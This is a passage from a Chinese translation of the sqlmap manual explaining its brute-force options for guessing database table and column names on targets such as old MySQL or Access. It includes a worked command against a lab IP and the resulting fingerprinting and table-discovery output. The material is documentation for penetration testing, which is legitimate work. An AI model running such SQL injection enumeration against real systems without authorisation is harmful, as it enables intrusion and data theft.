## 暴力破解

下面相关的开关用于进行暴力破解检查。

### 暴力破解表名称

开关: `--common-tables`

存在某些场景下，开关 `--tables` 并不能用于获取数据库中表的名称。这样的场景通常会在如下情况下发生： 

* 数据库管理系统是低于 5.0 版本的 MySQL, 对应的 `information_schema` 不存在。 
* 数据库管理系统是微软的 Access 数据库，并且其中的系统表`MSysObjects` 默认设置不可读。
* 当前会话用户对数据库管理系统中存储数据表定义的系统表没有读的权限。

如果出现前面两个场景中的任意一个，并且你开启了 `--tables` 开关，sqlmap 则会提示你是否使用暴力破解表名称技术。因而，就算出现上面两个场景之一，只要你开启了 `--common-tables`, sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出数据库管理系统中存在的常见数据表。

常见的数据表名列表存储在 `txt/common-tables.txt`, 支持用户进行任意修改。

正对 MySQL 4.1 目标的例子：

```
$ python sqlmap.py -u "http://192.168.136.129/mysql/get_int_4.php?id=1" --commo\
n-tables -D testdb --banner

[...]
[hh:mm:39] [INFO] testing MySQL
[hh:mm:39] [INFO] confirming MySQL
[hh:mm:40] [INFO] the back-end DBMS is MySQL
[hh:mm:40] [INFO] fetching banner
web server operating system: Windows
web application technology: PHP 5.3.1, Apache 2.2.14
back-end DBMS operating system: Windows
back-end DBMS: MySQL < 5.0.0
banner:    '4.1.21-community-nt'

[hh:mm:40] [INFO] checking table existence using items from '/software/sqlmap/tx
t/common-tables.txt'
[hh:mm:40] [INFO] adding words used on web page to the check list
please enter number of threads? [Enter for 1 (current)] 8
[hh:mm:43] [INFO] retrieved: users

Database: testdb
[1 table]
+-------+
| users |
+-------+
```

### 暴力破解列名

开关: `--common-columns`

对于任意数据表，可能存在开启了开关 `--columns`，仍不能够获取数据库表的列名的情况。这样的场景通常会在如下的情景下发生：

* 数据库管理系统是低于 5.0 版本的 MySQL, 对应的 `information_schema` 不存在。 
* 数据库管理系统是微软的 Access 数据库，相对应的列名信息在数据库系统表中不存在。
* 当前会话用户对数据库管理系统中存储数据表定义的系统表没有读的权限。

如果出现前面两个场景中的任意一个，并且你开启了 `--columns` 开关，sqlmap 则会提示你是否使用暴力破解表列名技术。因而，就算出现上面两个场景之一，只要你开启了 `--common-columns`, sqlmap 仍然可以识别出部分系统数据表。sqlmap 会尝试对系统表进行暴力破解，试图找出数据库管理系统中存在的常见数据表列名。

常见的数据表名列表存储在 `txt/common-columns.txt`, 支持用户进行任意修改。
